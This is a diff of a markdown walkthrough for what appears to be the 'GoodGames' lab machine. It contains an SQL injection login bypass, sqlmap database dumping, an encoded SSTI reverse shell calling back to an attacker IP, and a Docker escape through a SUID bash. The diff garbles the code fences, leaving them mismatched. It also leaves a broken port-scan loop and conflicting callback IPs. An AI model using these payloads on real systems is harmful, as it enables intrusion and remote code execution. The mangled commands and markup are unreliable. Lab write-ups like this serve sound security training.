@@ -13,10 +13,9 @@ The page title is GoodGames and the footer discloses that the site runs on goodg
 
 
 Directory enumaration:
-```
+```bash
 ffuf -u http://10.10.11.130/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 9265
-```
-
+```bash
 or
 
 ```
@@ -54,8 +53,7 @@ Progress: 13995 / 220559 (6.35%)
   
 Progress: 21372 / 220559 (9.69%)^C
 
-```
-
+```bash
 Payload:
 admin' or 1 = 1 -- -
 Replace in burp login request, just change admin param to the payload and forward.
@@ -63,7 +61,7 @@ Replace in burp login request, just change admin param to the payload and forwar
 To enumarate the Database using the vuln:
 1.  Save Burp Request to a file:
    goodgames.req
-```
+```bash
    POST /login HTTP/1.1
 Host: 10.10.11.130
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -84,16 +82,15 @@ email=admin@goodgames.htb-&password=password
 Notice that we have received the session cookie, we change the email back to the original one from the profile page.
    
    We parse file through sqlmap:
-```
+```bash
 sqlmap -r goodgames.req --dbs
 ```
-
+```sql
 
 
 ```
 sqlmap -r goodgames.req -D main --tables
-```
-
+```bash
 Parse through crackstation = superadministrator
 
 
@@ -110,19 +107,16 @@ Payload: {% raw %}{{7+7}}{% endraw %} or *
 - Then use `os.popen()` to execute a **reverse shell command**.
   
 Payload:
-```
+```bash
 echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
-```
-
+```bash
 ```
 nc -nvlp 4444
-```
-
+```bash
 Then we construct  SSTI payload to deliver on site through the name field.
-```
+```bash
 {% raw %}{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zLzQ0NDQgMD4mMQ===${IFS}|base64${IFS}-d|bash').read()}}{% endraw %}
-```
-
+```bash
 #### Privilege Escalation via Docker Escape
 After getting a shell on the system, we quickly notice that we are in a Docker container
 
@@ -130,26 +124,22 @@ After getting a shell on the system, we quickly notice that we are in a Docker c
 ```
 hostname -I
 ps auxww | grep docker
-```
-
-```
+```bash
+```bash
 touch from_host
 ls -l from_host # It shows up on the container
-```
-
+```bash
 ```
 mount
-```
-
+```bash
 With knowledge that the user directory is mounted in the Docker container, we can write files in the Host and change their permissions to root from within the container. These new permissions will be reflected to the Host system as well.
 
 
 
 Scan 172.19.0.1 to see available ports with bash 
-```
+```bash
 for PORT in {0..1000}; do timeout 1 bash -c "/dev/null" 2>/dev/null && echo "port $PORT is open"; done
-```
-
+```bash
 SSH open:
 ```
 script /dev/null bash 
@@ -160,13 +150,11 @@ ssh augustus@172.19.0.1
  # As root in the docker container
 chown root:root bash 
 chmod 4755 bash
-```
-
+```bash
 Login back to augustus and execute bash:
-```
+```bash
 ./bash -p
-```
-
+```bash
 
 Running `ldd` shows how this binary loads libraries
 ```
@@ -176,15 +164,13 @@ libtinfo.so.5 => not found
 libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fa964fc8000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa964e03000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fa964fd7000)
-```
-```
+```bash
 augustus@GoodGames:~$ ldd /bin/bash
 linux-vdso.so.1 (0x00007ffd31e97000)
 libtinfo.so.6 => /lib/x86_64-linux-gnu/libtinfo.so.6 (0x00007f28239dd000)
 libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f28239d7000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f2823812000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f2823b4e000)
-```
-
+```bash
 
 
